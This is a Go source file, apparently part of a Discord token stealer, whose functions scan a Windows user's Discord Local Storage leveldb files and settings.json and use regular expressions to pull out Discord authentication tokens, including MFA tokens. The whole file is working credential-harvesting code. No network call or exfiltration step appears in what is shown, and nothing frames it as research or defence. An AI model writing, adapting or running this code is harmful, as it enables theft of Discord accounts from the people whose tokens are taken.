package utils

import (
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

func SearchDiscordTokens() ([]string, error) {
	var tokens []string
	userProfile := os.Getenv("USERPROFILE")

	discordPaths := []string{
		filepath.Join(userProfile, "AppData", "Roaming", "Discord", "Local Storage", "leveldb"),
		filepath.Join(userProfile, "AppData", "Local", "Discord", "Local Storage", "leveldb"),
	}

	for _, path := range discordPaths {
		files, err := filepath.Glob(filepath.Join(path, "*.ldb"))
		if err != nil {
			continue
		}

		for _, file := range files {
			content, err := os.ReadFile(file)
			if err != nil {
				continue
			}

			contentStr := string(content)
			if strings.Contains(contentStr, "mfa.") || strings.Contains(contentStr, "token") {
				if token := extractDiscordToken(contentStr); token != "" {
					tokens = append(tokens, token)
				}
			}
		}
	}

	settingsPath := filepath.Join(userProfile, "AppData", "Roaming", "Discord", "settings.json")
	if content, err := os.ReadFile(settingsPath); err == nil {
		contentStr := string(content)
		if strings.Contains(contentStr, "token") {
			if token := extractDiscordToken(contentStr); token != "" {
				tokens = append(tokens, token)
			}
		}
	}

	unique := make(map[string]bool)
	var result []string
	for _, token := range tokens {
		if !unique[token] && token != "" {
			unique[token] = true
			result = append(result, token)
		}
	}

	return result, nil
}

func extractDiscordToken(content string) string {

	patterns := []string{
		`mfa\.[a-zA-Z0-9_-]{84}`,
		`[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}`,
		`[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{38}`,
	}

	for _, pattern := range patterns {
		re := regexp.MustCompile(pattern)
		matches := re.FindAllString(content, -1)
		for _, match := range matches {
			return match
		}
	}

	if idx := strings.Index(content, "\"token\":\""); idx != -1 {
		token := content[idx+9:]
		if end := strings.Index(token, "\""); end != -1 {
			return token[:end]
		}
	}

	return ""
}
